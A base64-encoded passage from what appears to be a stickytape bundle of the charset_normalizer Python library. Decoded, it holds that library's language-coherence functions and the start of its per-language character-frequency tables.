2UgbWF0Y2ggaXMgMS4pXG4gICAgIiIiXG4gICAgaWYgbGFuZ3VhZ2Ugbm90IGluIEZSRVFVRU5DSUVTOlxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJ7fSBub3QgYXZhaWxhYmxlIi5mb3JtYXQobGFuZ3VhZ2UpKVxuXG4gICAgY2hhcmFjdGVyX2FwcHJvdmVkX2NvdW50ID0gMCAgIyB0eXBlOiBpbnRcblxuICAgIGZvciBjaGFyYWN0ZXIgaW4gb3JkZXJlZF9jaGFyYWN0ZXJzOlxuICAgICAgICBpZiBjaGFyYWN0ZXIgbm90IGluIEZSRVFVRU5DSUVTW2xhbmd1YWdlXTpcbiAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgY2hhcmFjdGVyc19iZWZvcmVfc291cmNlID0gRlJFUVVFTkNJRVNbbGFuZ3VhZ2VdW1xuICAgICAgICAgICAgMCA6IEZSRVFVRU5DSUVTW2xhbmd1YWdlXS5pbmRleChjaGFyYWN0ZXIpXG4gICAgICAgIF0gICMgdHlwZTogTGlzdFtzdHJdXG4gICAgICAgIGNoYXJhY3RlcnNfYWZ0ZXJfc291cmNlID0gRlJFUVVFTkNJRVNbbGFuZ3VhZ2VdW1xuICAgICAgICAgICAgRlJFUVVFTkNJRVNbbGFuZ3VhZ2VdLmluZGV4KGNoYXJhY3RlcikgOlxuICAgICAgICBdICAjIHR5cGU6IExpc3Rbc3RyXVxuXG4gICAgICAgIGNoYXJhY3RlcnNfYmVmb3JlID0gb3JkZXJlZF9jaGFyYWN0ZXJzW1xuICAgICAgICAgICAgMCA6IG9yZGVyZWRfY2hhcmFjdGVycy5pbmRleChjaGFyYWN0ZXIpXG4gICAgICAgIF0gICMgdHlwZTogTGlzdFtzdHJdXG4gICAgICAgIGNoYXJhY3RlcnNfYWZ0ZXIgPSBvcmRlcmVkX2NoYXJhY3RlcnNbXG4gICAgICAgICAgICBvcmRlcmVkX2NoYXJhY3RlcnMuaW5kZXgoY2hhcmFjdGVyKSA6XG4gICAgICAgIF0gICMgdHlwZTogTGlzdFtzdHJdXG5cbiAgICAgICAgYmVmb3JlX21hdGNoX2NvdW50ID0gW1xuICAgICAgICAgICAgZSBpbiBjaGFyYWN0ZXJzX2JlZm9yZSBmb3IgZSBpbiBjaGFyYWN0ZXJzX2JlZm9yZV9zb3VyY2VcbiAgICAgICAgXS5jb3VudChcbiAgICAgICAgICAgIFRydWVcbiAgICAgICAgKSAgIyB0eXBlOiBpbnRcbiAgICAgICAgYWZ0ZXJfbWF0Y2hfY291bnQgPSBbXG4gICAgICAgICAgICBlIGluIGNoYXJhY3RlcnNfYWZ0ZXIgZm9yIGUgaW4gY2hhcmFjdGVyc19hZnRlcl9zb3VyY2VcbiAgICAgICAgXS5jb3VudChcbiAgICAgICAgICAgIFRydWVcbiAgICAgICAgKSAgIyB0eXBlOiBpbnRcblxuICAgICAgICBpZiBsZW4oY2hhcmFjdGVyc19iZWZvcmVfc291cmNlKSA9PSAwIGFuZCBiZWZvcmVfbWF0Y2hfY291bnQgPD0gNDpcbiAgICAgICAgICAgIGNoYXJhY3Rlcl9hcHByb3ZlZF9jb3VudCArPSAxXG4gICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIGlmIGxlbihjaGFyYWN0ZXJzX2FmdGVyX3NvdXJjZSkgPT0gMCBhbmQgYWZ0ZXJfbWF0Y2hfY291bnQgPD0gNDpcbiAgICAgICAgICAgIGNoYXJhY3Rlcl9hcHByb3ZlZF9jb3VudCArPSAxXG4gICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIGlmIChcbiAgICAgICAgICAgIGJlZm9yZV9tYXRjaF9jb3VudCAvIGxlbihjaGFyYWN0ZXJzX2JlZm9yZV9zb3VyY2UpID49IDAuNFxuICAgICAgICAgICAgb3IgYWZ0ZXJfbWF0Y2hfY291bnQgLyBsZW4oY2hhcmFjdGVyc19hZnRlcl9zb3VyY2UpID49IDAuNFxuICAgICAgICApOlxuICAgICAgICAgICAgY2hhcmFjdGVyX2FwcHJvdmVkX2NvdW50ICs9IDFcbiAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICByZXR1cm4gY2hhcmFjdGVyX2FwcHJvdmVkX2NvdW50IC8gbGVuKG9yZGVyZWRfY2hhcmFjdGVycylcblxuXG5kZWYgYWxwaGFfdW5pY29kZV9zcGxpdChkZWNvZGVkX3NlcXVlbmNlOiBzdHIpIC0+IExpc3Rbc3RyXTpcbiAgICAiIiJcbiAgICBHaXZlbiBhIGRlY29kZWQgdGV4dCBzZXF1ZW5jZSwgcmV0dXJuIGEgbGlzdCBvZiBzdHIuIFVuaWNvZGUgcmFuZ2UgLyBhbHBoYWJldCBzZXBhcmF0aW9uLlxuICAgIEV4LiBhIHRleHQgY29udGFpbmluZyBFbmdsaXNoL0xhdGluIHdpdGggYSBiaXQgYSBIZWJyZXcgd2lsbCByZXR1cm4gdHdvIGl0ZW1zIGluIHRoZSByZXN1bHRpbmcgbGlzdDtcbiAgICBPbmUgY29udGFpbmluZyB0aGUgbGF0aW4gbGV0dGVycyBhbmQgdGhlIG90aGVyIGhlYnJldy5cbiAgICAiIiJcbiAgICBsYXllcnMgPSBPcmRlcmVkRGljdCgpICAjIHR5cGU6IERpY3Rbc3RyLCBzdHJdXG5cbiAgICBmb3IgY2hhcmFjdGVyIGluIGRlY29kZWRfc2VxdWVuY2U6XG4gICAgICAgIGlmIGNoYXJhY3Rlci5pc2FscGhhKCkgaXMgRmFsc2U6XG4gICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIGNoYXJhY3Rlcl9yYW5nZSA9IHVuaWNvZGVfcmFuZ2UoY2hhcmFjdGVyKSAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXG5cbiAgICAgICAgaWYgY2hhcmFjdGVyX3JhbmdlIGlzIE5vbmU6XG4gICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIGxheWVyX3RhcmdldF9yYW5nZSA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuXG4gICAgICAgIGZvciBkaXNjb3ZlcmVkX3JhbmdlIGluIGxheWVyczpcbiAgICAgICAgICAgIGlmIChcbiAgICAgICAgICAgICAgICBpc19zdXNwaWNpb3VzbHlfc3VjY2Vzc2l2ZV9yYW5nZShkaXNjb3ZlcmVkX3JhbmdlLCBjaGFyYWN0ZXJfcmFuZ2UpXG4gICAgICAgICAgICAgICAgaXMgRmFsc2VcbiAgICAgICAgICAgICk6XG4gICAgICAgICAgICAgICAgbGF5ZXJfdGFyZ2V0X3JhbmdlID0gZGlzY292ZXJlZF9yYW5nZVxuICAgICAgICAgICAgICAgIGJyZWFrXG5cbiAgICAgICAgaWYgbGF5ZXJfdGFyZ2V0X3JhbmdlIGlzIE5vbmU6XG4gICAgICAgICAgICBsYXllcl90YXJnZXRfcmFuZ2UgPSBjaGFyYWN0ZXJfcmFuZ2VcblxuICAgICAgICBpZiBsYXllcl90YXJnZXRfcmFuZ2Ugbm90IGluIGxheWVyczpcbiAgICAgICAgICAgIGxheWVyc1tsYXllcl90YXJnZXRfcmFuZ2VdID0gY2hhcmFjdGVyLmxvd2VyKClcbiAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgbGF5ZXJzW2xheWVyX3RhcmdldF9yYW5nZV0gKz0gY2hhcmFjdGVyLmxvd2VyKClcblxuICAgIHJldHVybiBsaXN0KGxheWVycy52YWx1ZXMoKSlcblxuXG5kZWYgbWVyZ2VfY29oZXJlbmNlX3JhdGlvcyhyZXN1bHRzOiBMaXN0W0NvaGVyZW5jZU1hdGNoZXNdKSAtPiBDb2hlcmVuY2VNYXRjaGVzOlxuICAgICIiIlxuICAgIFRoaXMgZnVuY3Rpb24gbWVyZ2UgcmVzdWx0cyBwcmV2aW91c2x5IGdpdmVuIGJ5IHRoZSBmdW5jdGlvbiBjb2hlcmVuY2VfcmF0aW8uXG4gICAgVGhlIHJldHVybiB0eXBlIGlzIHRoZSBzYW1lIGFzIGNvaGVyZW5jZV9yYXRpby5cbiAgICAiIiJcbiAgICBwZXJfbGFuZ3VhZ2VfcmF0aW9zID0gT3JkZXJlZERpY3QoKSAgIyB0eXBlOiBEaWN0W3N0ciwgTGlzdFtmbG9hdF1dXG4gICAgZm9yIHJlc3VsdCBpbiByZXN1bHRzOlxuICAgICAgICBmb3Igc3ViX3Jlc3VsdCBpbiByZXN1bHQ6XG4gICAgICAgICAgICBsYW5ndWFnZSwgcmF0aW8gPSBzdWJfcmVzdWx0XG4gICAgICAgICAgICBpZiBsYW5ndWFnZSBub3QgaW4gcGVyX2xhbmd1YWdlX3JhdGlvczpcbiAgICAgICAgICAgICAgICBwZXJfbGFuZ3VhZ2VfcmF0aW9zW2xhbmd1YWdlXSA9IFtyYXRpb11cbiAgICAgICAgICAgICAgICBjb250aW51ZVxuICAgICAgICAgICAgcGVyX2xhbmd1YWdlX3JhdGlvc1tsYW5ndWFnZV0uYXBwZW5kKHJhdGlvKVxuXG4gICAgbWVyZ2UgPSBbXG4gICAgICAgIChcbiAgICAgICAgICAgIGxhbmd1YWdlLFxuICAgICAgICAgICAgcm91bmQoXG4gICAgICAgICAgICAgICAgc3VtKHBlcl9sYW5ndWFnZV9yYXRpb3NbbGFuZ3VhZ2VdKSAvIGxlbihwZXJfbGFuZ3VhZ2VfcmF0aW9zW2xhbmd1YWdlXSksXG4gICAgICAgICAgICAgICAgNCxcbiAgICAgICAgICAgICksXG4gICAgICAgIClcbiAgICAgICAgZm9yIGxhbmd1YWdlIGluIHBlcl9sYW5ndWFnZV9yYXRpb3NcbiAgICBdXG5cbiAgICByZXR1cm4gc29ydGVkKG1lcmdlLCBrZXk9bGFtYmRhIHg6IHhbMV0sIHJldmVyc2U9VHJ1ZSlcblxuXG5AbHJ1X2NhY2hlKG1heHNpemU9MjA0OClcbmRlZiBjb2hlcmVuY2VfcmF0aW8oXG4gICAgZGVjb2RlZF9zZXF1ZW5jZTogc3RyLCB0aHJlc2hvbGQ6IGZsb2F0ID0gMC4xLCBsZ19pbmNsdXNpb246IE9wdGlvbmFsW3N0cl0gPSBOb25lXG4pIC0+IENvaGVyZW5jZU1hdGNoZXM6XG4gICAgIiIiXG4gICAgRGV0ZWN0IEFOWSBsYW5ndWFnZSB0aGF0IGNhbiBiZSBpZGVudGlmaWVkIGluIGdpdmVuIHNlcXVlbmNlLiBUaGUgc2VxdWVuY2Ugd2lsbCBiZSBhbmFseXNlZCBieSBsYXllcnMuXG4gICAgQSBsYXllciA9IENoYXJhY3RlciBleHRyYWN0aW9uIGJ5IGFscGhhYmV0cy9yYW5nZXMuXG4gICAgIiIiXG5cbiAgICByZXN1bHRzID0gW10gICMgdHlwZTogTGlzdFtUdXBsZVtzdHIsIGZsb2F0XV1cbiAgICBpZ25vcmVfbm9uX2xhdGluID0gRmFsc2UgICMgdHlwZTogYm9vbFxuXG4gICAgc3VmZmljaWVudF9tYXRjaF9jb3VudCA9IDAgICMgdHlwZTogaW50XG5cbiAgICBsZ19pbmNsdXNpb25fbGlzdCA9IGxnX2luY2x1c2lvbi5zcGxpdCgiLCIpIGlmIGxnX2luY2x1c2lvbiBpcyBub3QgTm9uZSBlbHNlIFtdXG4gICAgaWYgIkxhdGluIEJhc2VkIiBpbiBsZ19pbmNsdXNpb25fbGlzdDpcbiAgICAgICAgaWdub3JlX25vbl9sYXRpbiA9IFRydWVcbiAgICAgICAgbGdfaW5jbHVzaW9uX2xpc3QucmVtb3ZlKCJMYXRpbiBCYXNlZCIpXG5cbiAgICBmb3IgbGF5ZXIgaW4gYWxwaGFfdW5pY29kZV9zcGxpdChkZWNvZGVkX3NlcXVlbmNlKTpcbiAgICAgICAgc2VxdWVuY2VfZnJlcXVlbmNpZXMgPSBDb3VudGVyKGxheWVyKSAgIyB0eXBlOiBDb3VudGVyXG4gICAgICAgIG1vc3RfY29tbW9uID0gc2VxdWVuY2VfZnJlcXVlbmNpZXMubW9zdF9jb21tb24oKVxuXG4gICAgICAgIGNoYXJhY3Rlcl9jb3VudCA9IHN1bShvIGZvciBjLCBvIGluIG1vc3RfY29tbW9uKSAgIyB0eXBlOiBpbnRcblxuICAgICAgICBpZiBjaGFyYWN0ZXJfY291bnQgPD0gVE9PX1NNQUxMX1NFUVVFTkNFOlxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICBwb3B1bGFyX2NoYXJhY3Rlcl9vcmRlcmVkID0gW2MgZm9yIGMsIG8gaW4gbW9zdF9jb21tb25dICAjIHR5cGU6IExpc3Rbc3RyXVxuXG4gICAgICAgIGZvciBsYW5ndWFnZSBpbiBsZ19pbmNsdXNpb25fbGlzdCBvciBhbHBoYWJldF9sYW5ndWFnZXMoXG4gICAgICAgICAgICBwb3B1bGFyX2NoYXJhY3Rlcl9vcmRlcmVkLCBpZ25vcmVfbm9uX2xhdGluXG4gICAgICAgICk6XG4gICAgICAgICAgICByYXRpbyA9IGNoYXJhY3RlcnNfcG9wdWxhcml0eV9jb21wYXJlKFxuICAgICAgICAgICAgICAgIGxhbmd1YWdlLCBwb3B1bGFyX2NoYXJhY3Rlcl9vcmRlcmVkXG4gICAgICAgICAgICApICAjIHR5cGU6IGZsb2F0XG5cbiAgICAgICAgICAgIGlmIHJhdGlvIDwgdGhyZXNob2xkOlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICBlbGlmIHJhdGlvID49IDAuODpcbiAgICAgICAgICAgICAgICBzdWZmaWNpZW50X21hdGNoX2NvdW50ICs9IDFcblxuICAgICAgICAgICAgcmVzdWx0cy5hcHBlbmQoKGxhbmd1YWdlLCByb3VuZChyYXRpbywgNCkpKVxuXG4gICAgICAgICAgICBpZiBzdWZmaWNpZW50X21hdGNoX2NvdW50ID49IDM6XG4gICAgICAgICAgICAgICAgYnJlYWtcblxuICAgIHJldHVybiBzb3J0ZWQocmVzdWx0cywga2V5PWxhbWJkYSB4OiB4WzFdLCByZXZlcnNlPVRydWUpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY2hhcnNldF9ub3JtYWxpemVyL2Fzc2V0cy9fX2luaXRfXy5weScsIGInIyAtKi0gY29kaW5nOiB1dGZfOCAtKi1cbmZyb20gY29sbGVjdGlvbnMgaW1wb3J0IE9yZGVyZWREaWN0XG5cbkZSRVFVRU5DSUVTID0gT3JkZXJlZERpY3QoXG4gICAgW1xuICAgICAgICAoXG4gICAgICAgICAgICAiRW5nbGlzaCIsXG4gICAgICAgICAgICBbXG4gICAgICAgICAgICAgICAgImUiLFxuICAgICAgICAgICAgICAgICJhIixcbiAgICAgICAgICAgICAgICAidCIsXG4gICAgICAgICAgICAgICAgImkiLFxuICAgICAgICAgICAgICAgICJvIixcbiAgICAgICAgICAgICAgICAibiIsXG4gICAgICAgICAgICAgICAgInMiLFxuICAgICAgICAgICAgICAgICJyIixcbiAgICAgICAgICAgICAgICAiaCIsXG4gICAgICAgICAgICAgICAgImwiLFxuICAgICAgICAgICAgICAgICJkIixcbiAgICAgICAgICAgICAgICAiYyIsXG4gICAgICAgICAgICAgICAgInUiLFxuICAgICAgICAgICAgICAgICJtIixcbiAgICAgICAgICAgICAgICAiZiIsXG4gICAgICAgICAgICAgICAgInAiLFxuICAgICAgICAgICAgICAgICJnIixcbiAgICAgICAgICAgICAgICAidyIsXG4gICAgICAgICAgICAgICAgInkiLFxuICAgICAgICAgICAgICAgICJiIixcbiAgICAgICAgICAgICAgICAidiIsXG4gICAgICAgICAgICAgICAgImsiLFxuICAgICAgICAgICAgICAgICJ4IixcbiAgICAgICAgICAgICAgICAiaiIsXG4gICAgICAgICAgICAgICAgInoiLFxuICAgICAgICAgICAgICAgICJxIixcbiAgICAgICAgICAgIF0sXG4gICAgICAgICksXG4gICAgICAgIChcbiAgICAgICAgICAgICJHZXJtYW4iLFxuICAgICAgICAgICAgW1xuICAgICAgICAgICAgICAgICJlIixcbiAgICAgICAgICAgICAgICAibiIsXG4gICAgICAgICAgICAgICAgImkiLFxuICAgICAgICAgICAgICAgICJyIixcbiAgICAgICAgICAgICAgICAicyIsXG4gICAgICAgICAgICAgICAgInQiLFxuICAgICAgICAgICAgICAgICJhIixcbiAgICAgICAgICAgICAgICAiZCIsXG4gICAgICAgICAgICAgICAgImgiLFxuICAgICAgICAgICAgICAgICJ1IixcbiAgICAgICAgICAgICAgICAibCIsXG4gICAgICAgICAgICAgICAgImciLFxuICAgICAgICAgICAgICAgICJvIixcbiAgICAgICAgICAgICAgICAiYyIsXG4gICAgICAgICAgICAgICAgIm0iLFxuICAgICAgICAgICAgICAgICJiIixcbiAgICAgICAgICAgICAgICAiZiIsXG4gICAgICAgICAgICAgICAgImsiLFxuICAgICAgICAgICAgICAgICJ3IixcbiAgICAgICAgICAgICAgICAieiIsXG4gICAgICAgICAgICAgICAgInAiLFxuICAgICAgICAgICAgICAgICJ2IixcbiAgICAgICAgICAgICAgICAiXHhjM1x4YmMiLFxuICAgICAgICAgICAgICAgICJceGMzXHhhNCIsXG4gICAgICAgICAgICAgICAgIlx4YzNceGI2IixcbiAgICAgICAgICAgICAgICAiaiIsXG4gICAgICAgICAgICBdLFxuICAgICAgICApLFxuICAgICAgICAoXG4gICAgICAgICAgICAiRnJlbmNoIixcbiAgICAgICAgICAgIFtcbiAgICAgICAgICAgICAgICAiZSIsXG4gICAgICAgICAgICAgICAgImEiLFxuICAgICAgICAgICAgICAgICJzIixcbiAgICAgICAgICAgICAgICAibiIsXG4gICAgICAgICAgICAgICAgImkiLFxuICAgICAgICAgICAgICAgICJ0IixcbiAgICAgICAgICAgICAgICAiciIsXG4gICAgICAgICAgICAgICAgImwiLFxuICAgICAgICAgICAgICAgICJ1IixcbiAgICAgICAgICAgICAgICAibyIsXG4gICAgICAgICAgICAgICAgImQiLFxuICAgICAgICAgICAgICAgICJjIixcbiAgICAgICAgICAgICAgICAicCIsXG4gICAgICAgICAgICAgICAgIm0iLFxuICAgICAgICAgICAgICAgICJceGMzXHhhOSIsXG4gICAgICAgICAgICAgICAgInYiLFxuICAgICAgICAgICAgICAgICJnIixcbiAgICAgICAgICAgICAgICAiZiIsXG4gICAgICAgICAgICAgICAgImIiLFxuICAgICAgICAgICAgICAgICJoIixcbiAgICAgICAgICAgICAgICAicSIsXG4gICAgICAgICAgICAgICAgIlx4YzNceGEwIixcbiAgICAgICAgICAgICAgICAieCIsXG4gICAgICAgICAgICAgICAgIlx4YzNceGE4IixcbiAgICAgICAgICAgICAgICAieSIsXG4gICAgICAgICAgICAgICAgImoiLFxuICAgICAgICAgICAgXSxcbiAgICAgICAgKSxcbiAgICAgICAgKFxuICAgICAgICAgICAgIkR1dGNoIixcbiAgICAgICAgICAgIFtcbiAgICAgICAgICAgICAgICAiZSIsXG4gICAgICAgICAgICAgICAgIm4iLFxuICAgICAgICAgICAgICAgICJhIixcbiAgICAgICAgICAgICAgICAiaSIsXG4gICAgICAgICAgICAgICAgInIiLFxuICAgICAgICAgICAgICAgICJ0IixcbiAgICAgICAgICAgICAgICAibyIsXG4gICAgICAgICAgICAgICAgImQiLFxuICAgICAgICAgICAgICAgICJzIixcbiAgICAgICAgICAgICAgICAibCIsXG4gICAgICAgICAgICAgICAgImciLFxuICAgICAgICAgICAgICAgICJoIixcbiAgICAgICAgICAgICAgICAidiIsXG4gICAgICAgICAgICAgICAgIm0iLFxuICAgICAgICAgICAgICAgICJ1IixcbiAgICAgICAgICAgICAgICAiayIsXG4gICAgICAgICAgICAgICAgImMiLFxuICAgICAgICAgICAgICAgICJwIixcbiAgICAgICAgICAgICAgICAiYiIsXG4gICAgICAgICAgICAgICAgInciLFxuICAgICAgICAgICAgICAgICJqIixcbiAgICAgICAgICAgICAgICAieiIsXG4gICAgICAgICAgICAgICAgImYiLFxuICAgICAgICAgICAgICAgICJ5IixcbiAgICAgICAgICAgICAgICAieCIsXG4gICAgICAgICAgICAgICAgIlx4YzNceGFiIixcbiAgICAgICAgICAgIF0sXG4gICAgICAgICksXG4gICAgICAgIChcbiAgICAgICAgICAgICJJdGFsaWFuIixcbiAgICAgICAgICAgIFtcbiAgICAgICAgICAgICAgICAiZSIsXG4gICAgICAgICAgICAgICAgImkiLFxuICAgICAgICAgICAgICAgICJhIixcbiAgICAgICAgICAgICAgICAibyIsXG4gICAgICAgICAgICAgICAgIm4iLFxuICAgICAgICAgICAgICAgICJsIixcbiAgICAgICAgICAgICAgICAidCIsXG4gICAgICAgICAgICAgICAgInIiLFxuICAgICAgICAgICAgICAgICJzIixcbiAgICAgICAgICAgICAgICAiYyIsXG4gICAgICAgICAgICAgICAgImQiLFxuICAgICAgICAgICAgICAgICJ1IixcbiAgICAgICAgICAgICAgICAicCIsXG4gICAgICAgICAgICAgICAgIm0iLFxuICAgICAgICAgICAgICAgICJnIixcbiAgICAgICAgICAgICAgICAidiIsXG4gICAgICAgICAgICAgICAgImYiLFxuICAgICAgICAgICAgICAgICJiIixcbiAgICAgICAgICAgICAgICAieiIsXG4gICAgICAgICAgICAgICAgImgiLFxuICAgICAgICAgICAgICAgICJxIixcbiAgICAgICAgICAgICAgICAiXHhjM1x4YTgiLFxuICAgICAgICAgICAgICAgICJceGMzXHhhMCIsXG4gICAgICAgICAgICAgICAgImsiLFxuICAgICAgICAgICAgICAgICJ5IixcbiAgICAgICAgICAgICAgICAiXHhjM1x4YjIiLFxuICAgICAgICAgICAgXSxcbiAgICAgICAgKSxcbiAgICAgICAgKFxuICAgICAgICAgICAgIlBvbGlzaCIsXG4gICAgICAgICAgICBbXG4gICAgICAgICAgICAgICAgImEiLFxuICAgICAgICAgICAgICAgICJpIixcbiAgICAgICAgICAgICAgICAibyIsXG4gICAgICAgICAgICAgICAgImUiLFxuICAgICAgICAgICAgICAgICJuIixcbiAgICAgICAgICAgICAgICAiciIsXG4gICAgICAgICAgICAgICAgInoiLFxuICAgICAgICAgICAgICAgICJ3IixcbiAgICAgICAgICAgICAgICAicyIsXG4gICAgICAgICAgICAgICAgImMiLFxuICAgICAgICAgICAgICAgICJ0IixcbiAgICAgICAgICAgICAgICAiayIsXG4gICAgICAgICAgICAgICAgInkiLFxuICAgICAgICAgICAgICAgICJkIixcbiAgICAgICAgICAgICAgICAicCIsXG4gICAgICAgICAgICAgICAgIm0iLFxuICAgICAgICAgICAgICAgICJ1IixcbiAgICAgICAgICAgICAgICAibCIsXG4gICAgICAgICAgICAgICAgImoiLFxuICAgICAgICAgICAgICAgICJceGM1XHg4MiIsXG4gICAgICAgICAgICAgICAgImciLFxuICAgICAgICAgICAgICAgICJiIixcbiAgICAgICAgICAgICAgICAiaCIsXG4gICAgICAgICAgICAgICAgIlx4YzRceDg1IixcbiAgICAgICAgICAgICAgICAiXHhjNFx4OTkiLFxuICAgICAgICAgICAgICAgICJceGMzXHhiMyIsXG4gICAgICAgICAgICBdLFxuICAgICAgICApLFxuICAgICAgICAoXG4gICAgICAgICAgICAiU3BhbmlzaCIsXG4gICAgICAgICAgICBbXG4gICAgICAgICAgICAgICAgImUiLFxuICAgICAgICAgICAgICAgICJhIixcbiAgICAgICAgICAgICAgICAibyIsXG4gICAgICAgICAgICAgICAgIm4iLFxuICAgICAgICAgICAgICAgICJzIixcbiAgICAgICAgICAgICAgICAiciIsXG4gICAgICAgICAgICAgICAgImkiLFxuICAgICAgICAgICAgICAgICJsIixcbiAgICAgICAgICAgICAgICAiZCIsXG4gICAgICAgICAgICAgICAgInQiLFxuICAgICAgICAgICAgICAgICJjIixcbiAgICAgICAgICAgICAgICAidSIsXG4gICAgICAgICAgICAgICAgIm0iLFxuICAgICAgICAgICAgICAgICJwIixcbiAgICAgICAgICAgICAgICAiYiIsXG4gICAgICAgICAgICAgICAgImciLFxuICAgICAgICAgICAgICAgICJ2IixcbiAgICAgICAgICAgICAgICAiZiIsXG4gICAgICAgICAgICAgICAgInkiLFxuICAgICAgICAgICAgICAgICJceGMzXHhiMyIsXG4gICAgICAgICAgICAgICAgImgiLFxuICAgICAgICAgICAgICAgICJxIixcbiAgICAgICAgICAgICAgICAiXHhjM1x4YWQiLFxuICAgICAgICAgICAgICAgICJqIixcbiAgICAgICAgICAgICAgICAieiIsXG4gICAgICAgICAgICAgICAgIlx4YzNceGExIixcbiAgICAgICAgICAgIF0sXG4gICAgICAgICksXG4gICAgICAgIChcbiAgICAgICAgICAgICJSdXNzaWFuIixcbiAgICAgICAgICAgIFtcbiAgICAgICAgICAgICAgICAiXHhkMFx4YmUiLFxuICAgICAgICAgICAgICAgICJceGQwXHhiMCIsXG4gICAgICAgICAgICAgICAgIlx4ZDBceGI1IixcbiAgICAgICAgICAgICAgICAiXHhkMFx4YjgiLFxuICAgICAgICAgICAgICAgICJceGQwXHhiZCIsXG4gICAgICAgICAgICAgICAgIlx4ZDFceDgxIixcbiAgICAgICAgICAgICAgICAiXHhkMVx4ODIiLFxuICAgICAgICAgICAgICAgICJceGQxXHg4MCIsXG4gICAgICAgICAgICAgICAgIlx4ZDBceGIyIixcbiAgICAgICAgICAgICAgICAiXHhkMFx4YmIiLFxuICAgICAgICAgICAgICAgICJceGQwXHhiYSIsXG4gICAgICAgICAgICAgICAgIlx4ZDBceGJjIixcbiAgICAgICAgICAgICAgICAiXHhkMFx4YjQiLFxuICAgICAgICAgICAgICAgICJceGQwXHhiZiIsXG4gICAgICAgICAgICAgICAgIlx4ZDFceDgzIixcbiAgICAgICAgICAgICAgICAiXHhkMFx4YjMiLFxuICAgICAgICAgICAgICAgICJceGQxXHg4ZiIsXG4gICAgICAgICAgICAgICAgIlx4ZDFceDhiIixcbiAgICAgICAgICAgICAgICAiXHhkMFx4YjciLFxuICAgICAgICAgICAgICAgICJceGQwXHhiMSIsXG4gICAgICAgICAgICAgICAgIlx4ZDBceGI5IixcbiAgICAgICAgICAgICAgICAiXHhkMVx4OGMiLFxuICAgICAgICAgICAgICAgICJceGQxXHg4NyIsXG4gICAgICAgICAgICAgICAgIlx4ZDFceDg1IixcbiAgICAgICAgICAgICAgICAiXHhkMFx4YjYiLFxuICAgICAgICAgICAgICAgICJceGQxXHg4NiIsXG4gICAgICAgICAgICBdLFxuICAgICAgICApLFxuICAgICAgICAoXG4gICAgICAgICAgICAiSmFwYW5lc2UiLFxuICAgICAgICAgICAgW1xuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YWUiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YWIiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4Mlx4OGIiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4OWYiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YWYiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4M1x4YmMiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YTgiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4OTciLFxuICAgICAgICAgICAgICAgICJceGUzXHg4Mlx4OTIiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YTciLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YTYiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4OGMiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4ODQiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4M1x4YjMiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4Mlx4OGMiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YWEiLFxuICAgICAgICAgICAgICAgICJceGU1XHhiOVx4YjQiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4Mlx4YjkiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4YTMiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4M1x4YWIiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4OGIiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4Mlx4ODkiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4ODIiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4MVx4OTUiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4Mlx4ODIiLFxuICAgICAgICAgICAgICAgICJceGUzXHg4Mlx4OGEiLFxuICAgICAgICAgICAgXSxcbiAgICAgICAgKSxcbiAgICAgICAgKFxuICAgICAgICAgICAgIlBvcnR1Z3Vlc2UiLFxuICAgICAgICAgICAgW1xuICAgICAgICAgICAgICAgICJhIixcbiAgICAgICAgICAgICAgICAiZSIsXG4gICAgICAgICAgICAgICAgIm8iLFxuICAgICAgICAgICAgICAgICJzIixcbiAgICAgICAgICAgICAgICAiaSIsXG4gICAgICAgICAgICAgICAgInIiLFxuICAgICAgICAgICAgICAgICJkIixcbiAgICAgICAgICAgICAgICAibiIsXG4gICAgICAgICAgICAgICAgInQiLFxuICAgICAgICAgICAgICAgICJtIixcbiAgICAgICAgICAgICAgICAidSIsXG4gICAgICAgICAgICAgICAgImMiLFxuICAgICAgICAgICAgICAgICJsIixcbiAgICAgICAgICAgICAgICAicCIsXG4gICAgICAgICAgICAgICAgImciLFxuICAgICAgICAgICAgICAgICJ2IixcbiAgICAgICAgICAgICAgICAiYiIsXG4gICAgICAgICAgICAgICAgImYiLFxuICAgICAgICAgICAgICAgICJoIixcbiAgICAgICAgICAgICAgICAiXHhjM1x4YTMiLFxuICAgICAgICAgICAgICAgICJxIixcbiAgICAgICAgICAgICAgICAiXHhjM1x4YTkiLFxuICAgICAgICAgICAgICAgICJceGMzXHhhNyIsXG4gICAgICAgICAgICAgICAgIlx4YzNceGExIixcbiAgICAgICAgICAgICAgICAieiIsXG4gICAgICAgICAgICAgICAgIlx4YzNceGFkIixcbiAgICAgICAgICAgIF0sXG4gICAg